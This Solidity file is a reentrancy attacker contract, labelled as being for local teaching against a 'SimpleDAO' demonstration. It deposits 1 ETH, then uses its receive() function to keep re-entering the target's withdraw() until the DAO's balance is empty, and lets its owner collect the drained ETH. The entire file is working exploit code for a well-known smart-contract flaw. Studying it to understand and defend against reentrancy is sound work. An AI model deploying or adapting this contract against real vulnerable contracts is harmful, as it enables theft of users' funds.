// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// !! LOCAL TEACHING ONLY - DO NOT DEPLOY TO ANY REAL NETWORK !!
// Reentrancy attacker for SimpleDAO demonstration

interface ISimpleDAO {
    function deposit() external payable;
    function withdraw() external;
}

contract DAOAttacker {
    ISimpleDAO public dao;
    address public owner;
    uint256 public attackCount;

    constructor(address _dao) {
        dao = ISimpleDAO(_dao);
        owner = msg.sender;
    }

    // Step 1: deposit seed ETH, then trigger reentrancy
    function attack() external payable {
        require(msg.value == 1 ether, "Send exactly 1 ETH");
        dao.deposit{value: msg.value}();
        dao.withdraw();
    }

    // Step 2: called every time DAO pushes ETH — keep re-entering while DAO has funds
    receive() external payable {
        if (address(dao).balance > 0) {
            attackCount++;
            dao.withdraw();
        }
    }

    function collectFunds() external {
        require(msg.sender == owner, "Owner only");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
